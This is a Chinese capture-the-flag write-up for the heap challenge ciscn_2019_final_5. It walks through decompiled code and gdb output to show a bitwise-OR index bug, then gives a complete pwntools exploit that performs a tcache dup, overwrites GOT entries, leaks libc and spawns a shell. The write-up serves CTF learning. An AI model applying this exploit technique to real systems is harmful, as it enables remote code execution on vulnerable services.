# ciscn_2019_final_5

[题目地址](https://buuoj.cn/challenges#ciscn_2019_final_5)

我是连一点位运算都不会啊。

```
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

难得一见保护没开全的堆题。留个Partial RELRO肯定是要我们改got表了，看main函数。

```c
void __fastcall __noreturn main(__int64 a1, char **a2, char **a3)
{
  int v3; // eax

  sub_400966(a1, a2, a3);
  while ( 1 )
  {
    while ( 1 )
    {
      menu();
      v3 = sub_4009E2(a1);
      if ( v3 != 2 )
        break;
      delete(a1);
    }
    if ( v3 == 3 )
    {
      edit(a1);
    }
    else
    {
      if ( v3 != 1 )
      {
        puts("See you.");
        exit(0);
      }
      new(a1);
    }
  }
}
```

没看见泄露地址函数，经验告诉我不妙。new函数的实现也是很新颖。

```c
__int64 new()
{
  __int64 result; // rax
  int i; // [rsp+4h] [rbp-1Ch]
  int v2; // [rsp+8h] [rbp-18h]
  int v3; // [rsp+Ch] [rbp-14h]
  void *buf; // [rsp+10h] [rbp-10h]
  __int64 v5; // [rsp+18h] [rbp-8h]

  printf("index: ");
  v3 = sub_4009E2("index: ");
  if ( v3 < 0 || v3 > 16 )
  {
    puts("index is invalid.");
    exit(-1);
  }
  printf("size: ");
  v2 = sub_4009E2("size: ");
  if ( v2 < 0 || v2 > 4096 )
  {
    puts("size is invalid.");
    exit(-1);
  }
  buf = malloc(v2);
  if ( !buf )
  {
    puts("malloc error.");
    exit(-1);
  }
  printf("content: ");
  read(0, buf, v2);
  sub_400AE5(buf);                              // 这里透露给我们低12bit，其实是在提示我们
  result = sub_400AB0(buf, (unsigned int)v3);   // 把堆块地址和对应的索引按位或，结果存入堆数组
  v5 = result;
  for ( i = 0; i <= 16; ++i )
  {
    result = qword_6020E0[i];                   // 这里按照申请的先后顺序存放堆块，而不是提供的索引。一般的实现是，索引为1就存到heap[1],索引为5就存到heap[5]之类的。而这里不一样，第几次申请的堆块就存到第几个索引，索引由上面的按位或标记
    if ( !result )
    {
      qword_6020E0[i] = v5;
      result = i;
      dword_602180[i] = v2;
      break;
    }
  }
  if ( i == 17 )
  {
    puts("heap note is full.");
    exit(-1);
  }
  return result;
}
```

用位运算标记堆块索引。看看其他函数怎么处理这样的索引。

```c
int edit()
{
  int result; // eax
  int i; // [rsp+8h] [rbp-8h]
  int v2; // [rsp+Ch] [rbp-4h]

  printf("index: ");
  result = sub_4009E2();
  v2 = result;
  if ( result < 0 || result > 16 )
  {
    puts("index is invalid.");
    exit(-1);
  }
  for ( i = 0; i <= 16; ++i )
  {
    result = sub_400ACE(qword_6020E0[i]);       // 将存储的堆块地址与0xf按位与，取出索引存到result
    if ( result == v2 )
    {
      printf("content: ");
      sub_400D68(qword_6020E0[i] & 0xFFFFFFFFFFFFFFF0LL, (unsigned int)dword_602180[i]);// 堆块地址与0xFFFFFFFFFFFFFFF0按位与，理论上应该正确取出原本的堆块地址
      result = puts("edit success.\n");
      break;
    }
  }
  if ( i == 17 )
  {
    puts("edit is invalid.");
    exit(-1);
  }
  return result;
}
```

与0xf按位与取出索引，与0xfffffffffffffff0按位与取出堆块地址。自己实验了几下，确实可以。

```
1. new a note.
2. delete a note.
3. edit a note.
4. exit.
your choice: 1
index: 15
size: 16
content: aaaa
low 12 bits: 0x2a0


Breakpoint 1, 0x0000000000400c84 in ?? ()
(gdb) x/32g 0x6020e0
0x6020e0:       0x00000000015c92af      0x0000000000000000
0x6020f0:       0x0000000000000000      0x0000000000000000
0x602100:       0x0000000000000000      0x0000000000000000
0x602110:       0x0000000000000000      0x0000000000000000
0x602120:       0x0000000000000000      0x0000000000000000
(gdb) x/32g 0x00000000015c92a0
0x15c92a0:      0x0000000a61616161      0x0000000000000000
0x15c92b0:      0x0000000000000000      0x0000000000020d51
0x15c92c0:      0x0000000000000000      0x0000000000000000
0x15c92d0:      0x0000000000000000      0x0000000000000000
```

```python
print(hex(0x00000000015c92af&0xfffffffffffffff0),hex(0x00000000015c92af&0xf))
#0x15c92a0 0xf
```

delete函数里也没有uaf。

```c
int delete()
{
  int result; // eax
  int i; // [rsp+8h] [rbp-8h]
  int v2; // [rsp+Ch] [rbp-4h]

  printf("index: ");
  result = sub_4009E2();
  v2 = result;
  if ( result < 0 || result > 16 )
  {
    puts("index is invalid.");
    exit(-1);
  }
  for ( i = 0; i <= 16; ++i )
  {
    result = sub_400ACE(qword_6020E0[i]);
    if ( result == v2 )
    {
      free((void *)(qword_6020E0[i] & 0xFFFFFFFFFFFFFFF0LL));// 同样是取出地址
      qword_6020E0[i] = 0LL;
      dword_602180[i] = 0;
      result = puts("free success.\n");
      break;
    }
  }
  if ( i == 17 )
  {
    puts("free is invalid.");
    exit(-1);
  }
  return result;
}
```

既然一次都是如此天衣无缝，这题怎么做？为什么不问问[wp](https://blog.csdn.net/weixin_44145820/article/details/105514596)呢？还是自己实验少了，没有发现这个逻辑漏洞。刚才我们试了索引15的情况，要是索引16呢？

```
1. new a note.
2. delete a note.
3. edit a note.
4. exit.
your choice: 1
index: 16
size: 16
content: aaaa
low 12 bits: 0x2a0


Breakpoint 1, 0x0000000000400c84 in ?? ()
(gdb) x/32g 0x6020e0
0x6020e0:       0x00000000009982b0      0x0000000000000000
0x6020f0:       0x0000000000000000      0x0000000000000000
0x602100:       0x0000000000000000      0x0000000000000000
(gdb) x/32g 0x00000000009982b0 
0x9982b0:       0x0000000000000000      0x0000000000020d51
0x9982c0:       0x0000000000000000      0x0000000000000000
0x9982d0:       0x0000000000000000      0x0000000000000000
(gdb) x/32g 0x00000000009982b0 -16
0x9982a0:       0x0000000a61616161      0x0000000000000000
0x9982b0:       0x0000000000000000      0x0000000000020d51
0x9982c0:       0x0000000000000000      0x0000000000000000
```

```python
print(hex(0x00000000009982b0&0xfffffffffffffff0),hex(0x00000000009982b0&0xf))
#0x9982b0 0x0
```

出大事了，堆块地址被改动，索引从16变成0了。当我们使用小于16的索引时，0x1-0xf都可以被很好地保留在最后一位。然而当索引为16时，堆块地址的末尾12bit总是0x2a0，0x2a0|0x10=0x2b0，巧妙地进了一位，导致之后再按位与就没用了。这时无论edit还是delete都会影响到下面的堆块。了解这点后就可以分析exp了。

```python
from pwn import *

r = remote("node4.buuoj.cn", 29662)
#r = process("./ciscn_2019_final_5/ciscn_2019_final_5")

context.log_level = 'debug'
DEBUG = 0
if DEBUG:
    gdb.attach(r, 
    ''' 
    b *0x400E93
    c
    ''')
content = 0x6020e0
free_got=0x602018
puts_plt=0x400790
puts_got=0x602020
atoi_got=0x602078

def add(index, size, content):
	r.recvuntil("your choice: ")
	r.sendline('1')
	r.recvuntil("index: ")
	r.sendline(str(index))
	r.recvuntil("size: ")
	r.sendline(str(size))
	r.recvuntil("content: ")
	r.send(content)

def delete(index):
	r.recvuntil("your choice: ")
	r.sendline('2')
	r.recvuntil("index: ")
	r.sendline(str(index))


def edit(index, content):
	r.recvuntil("your choice: ")
	r.sendline('3')
	r.recvuntil("index: ")
	r.sendline(str(index))
	r.recvuntil("content: ")
	r.send(content)

add(16,0x10,p64(0)+p64(0x90)) #申请索引16堆块，提前布置假的prev_size和size
add(1, 0xc0, 'aa\n') #这个堆块和上面那个堆块是挨着的，地址正好和上面那个堆块一样。0xc0是因为这个大小正好可以包住content和size数组
delete(0) #delete那个索引16的堆块
delete(1) #delete索引1的堆块，但这里的地址和索引16的堆块是一样的（全是因为那个位运算让正确的堆块地址往后偏了16位，恰巧和下一个堆块重合），因此这里是个tcache dup
add(2, 0x80, p64(0)+p64(0x21)+p64(content)) #刚刚delete的1号堆块大小为0xc0，进入unsorted bin，再申请堆块就从刚才那个堆块里切割，因此这里编辑了1号堆块的prev_size+size+fd，实施传统的tcache dup攻击
add(3, 0xc0, 'aaa\n') #取出无用的堆块，经典tcache dup利用操作
add(4, 0xc0, p64(free_got)+p64(puts_got+1)+p64(atoi_got-4)+p64(0)*17+p32(0x10)*8) #这里申请到的堆块就在content也就是0x6020e0处了，编辑为一堆函数的地址方便改got表和泄露地址
edit(8,p64(puts_plt)*2) #edit 8号堆块是因为free_got=0x602018&0xf=0x8，改成puts泄露地址
delete(1) #泄露puts地址
puts = u64(r.recv(6).ljust(8, b'\x00'))
success("puts:"+hex(puts))
libc_base = puts - 526784
system = libc_base + 324672
edit(4, p64(system)*2) #edit 4号堆块是因为我们p64(atoi_got-4)，0x602078-4&0xf=0x4
r.recvuntil("your choice: ")
r.sendline('/bin/sh\x00')
r.interactive()
```

所以这道题其实就是利用逻辑漏洞打一个tcache dup。